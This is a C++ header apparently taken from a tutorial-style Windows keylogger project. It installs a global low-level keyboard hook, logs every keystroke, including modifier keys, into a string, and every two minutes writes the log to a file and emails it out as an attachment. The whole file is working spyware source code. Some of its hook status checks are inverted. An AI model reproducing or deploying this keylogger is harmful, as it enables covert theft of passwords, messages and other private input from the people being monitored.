#ifndef KEYBHOOK_H
#define KEYBHOOK_H
#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"
/*
    This file use WinAPI function to hook to keyboard event
    It captures all the keyboard event (KEY_UP, KEY_DOWN and KEY_PRESS)
*/
std::string keylog = "";
void TimerSendMail ()
    {
        //if there is nothing to write... return...
        if (keylog.empty ())
            return;
        //try to write to file...
        std::string last_file = IO::WriteLog (keylog);
        //if there is no file, return
        if (last_file.empty ())
            {
                Helper::WriteAppLog ("File creation was not succesfull. Keylog '" + keylog + "'");
                return;
            }
        //send mail... subject is "Log [filename]" for example "Log [19.01.2015 02_46_32]"
        int x = Mail::SendMail ("Log [" + last_file + "]",
                    "Hi :)\nThe file has been attached to this mail :)\nFor testing there is"
                " content of the file:\n\n--------------------------\n" + keylog,
        IO::GetOurPath (true) +  last_file);
        if (x != 7) //sending mail failed!
            Helper::WriteAppLog ("Mail was not sent! Error code: " + Helper::ToString (x));
        else keylog = "";

    }
//create our timer... it will periodically call TimerSendMail function (defined above)
//every 2000 * 60 ms (2 minutes), infiniti number of times
//this timer will be started asynchronous, so, it will NOT block our main thread :)
Timer MailTimer (TimerSendMail, 2000 * 60, Timer::Infinite);

//define global variable eHook of type HHOOK (handle to hook) that is a pointer to our hook
//we will assign to it when installing hook, and use it with other functions
//for example, to propagate hook to other application
HHOOK eHook = NULL;

//this is our main function; it will be called by the system every time
//keyboard key is pressed. It is necessary for this function to
//pass this hook to other threads in queue (by calling CallNexHook function)
LRESULT OurKeyboardProc (int nCode, WPARAM wparam, LPARAM lparam)
    {
        //if we receive nCode less than zero that means that we must propagate the hook
        //(we are not interested in that type of hook, from it we cannot intercept key presses)
        if (nCode < 0)
            CallNextHookEx(eHook, nCode,  wparam, lparam);
        //wParam is our key type
        //lparam is type of KBDLLHOOKSTRUCT (in this, keyboard hooking, case)
        //which contains a lot of data, for us vkCode and scanCode are points of interest
        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam; //cast to "pointer to KBDLLHOOKSTRUCT"
        if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) //key DOWN
            {
                //append keys to our string (which will be saved to file, periodically)
                keylog += Keys::KEYS[kbs->vkCode].Name;
                if (kbs->vkCode == VK_RETURN) //if ENTER key was pressed
                    keylog += '\n'; //append it
            }
        else if (wparam == WM_KEYUP || wparam  == WM_SYSKEYUP) //key UP
            {
                //we need to register whether key are released, but only for system keys
                //for example, we are not interested in detecting of release of key A
                //but, we are interested in detecting the SHIFT key release (key up)
                //so, the idea is to output HTML-like prints for system keys:
                //[Key] for pressed (key down) and [/Key] for key up (release)
                //[Shift][A][B][C][/Shift] <-- this means user typed "ABC" capital case
                //[Shift][A][/Shift][B][C] <-- this means user typed "Abc", only first letter in capital
                DWORD key = kbs->vkCode;
                if (key == VK_CONTROL //CTRL
                        || key == VK_LCONTROL //Left CTRL
                        || key == VK_RCONTROL //Right CTRL
                        || key == VK_SHIFT //SHIFT
                        || key == VK_LSHIFT //Left SHIFT
                        || key == VK_RSHIFT //Right SHIFT
                        || key == VK_MENU //ALT
                        || key == VK_LMENU //Left ALT
                        || key == VK_RMENU //Right ALT
                        || key == VK_CAPITAL //CAPS LOCK
                        || key == VK_NUMLOCK //NUM LOCK
                        || key == VK_LWIN //Left WIN
                        || key == VK_RWIN) //RWIN WIN
                    //if system key, insert / after [
                    //for example [Shift], we insert / after [: [/Shift]
                    {
                        string KeyName = Keys::KEYS[kbs->vkCode].Name;
                        KeyName.insert (1, "/");
                        keylog += KeyName;
                    }
            }
        return CallNextHookEx(eHook, nCode,  wparam, lparam);
    }

//function that installs global hook; it just sets out eHook variable to value
//returned by SetWindowsHookEx function
bool InstalHook ()
    {
        //start our timer for logging and sending mail...
        //start it asychronous
        Helper::WriteAppLog ("Hook started... Timer started");
        MailTimer.Start (true);
        /*
         * Parameters:
         * #WH_KEYBOARD_LL this indicates that we use keyboard hook,
         *                 and LL (shorthand for Low-Level) indicates that is a global hook
         *                 The value of the constant is 13
         * #OutKeyboardProc this is a procedure that will be invoked by the hook/system
         *                 every time user the key is pressed. We need to convert it to
         *                 HOOKPROC because SetWindowsHookEx function accepts a handle
         *                 to hook procedure
         * #eInstance      parameter of type HINSTANCE (handle to instance); we need to specify
         *                 the running module. There is a function GetModuleHandle which serves
         *                 for obtaining hinstance.
         * #dwThreadId     The identifier of the thread with which the hook procedure is to be associated.
         *                 If this parameter is zero, the hook procedure is associated with all existing threads
         *                 IsAlive in the same desktop as the calling thread. We set this parameter to zero.
         *
         * */
        eHook = SetWindowsHookEx (WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle (NULL), 0);
        //so, we need to check if the hook was successful, and return the corresponding value true/false
        return eHook == NULL;
    }

//this functions unhook all keyboard events from our process
bool UninstalHook ()
    {
        //the only parameter is our eHook
        BOOL b = UnhookWindowsHookEx (eHook);
        eHook = NULL; //set eHook to NULL
        return (bool)b;
    }
//function returns true if the hook is installed (and intercepting keyboard events)
bool IsHooked ()
    {
        //compare eHook with NULL
        return (bool)(eHook == NULL);
    }
#endif // KEYBHOOK_H
